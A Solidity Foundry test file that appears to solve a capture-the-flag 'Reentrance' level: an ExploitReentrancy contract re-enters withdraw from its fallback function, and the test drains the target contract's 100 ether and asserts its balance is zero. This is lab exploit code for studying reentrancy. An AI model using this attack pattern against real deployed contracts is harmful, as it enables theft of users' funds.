// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface ReentranceI {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
    receive() external payable;
}
contract ExploitReentrancy {
    ReentranceI public ri;
    constructor(ReentranceI _ri) {
        ri = _ri;
    }

    function withdrawE() public {
        ri.withdraw(1 ether);
    }

    fallback() external payable {
        ri.withdraw(1 ether);
    }
}
contract ReentranceTest is Test {
    ReentranceI public re;
    ExploitReentrancy public er;

    address public hacker = address(0x1337);

    function setUp() public {
        address deployedAddress = deployCode("10_Reentrance.sol:Reentrance");
        re = ReentranceI(payable(deployedAddress));
        er = new ExploitReentrancy(re);
        vm.deal(address(re), 100 ether);
        vm.deal(hacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(hacker);
        console.log("Contract initial balance: ", address(re).balance);
        re.donate{value: 1 ether}(address(er));
        console.log("Contract balance after donate: ", address(re).balance);
        er.withdrawE();
        console.log(
            "Contract balance after reentrant function: ",
            address(re).balance
        );
        assertEq(address(re).balance, 0);
        vm.stopPrank();
    }
}
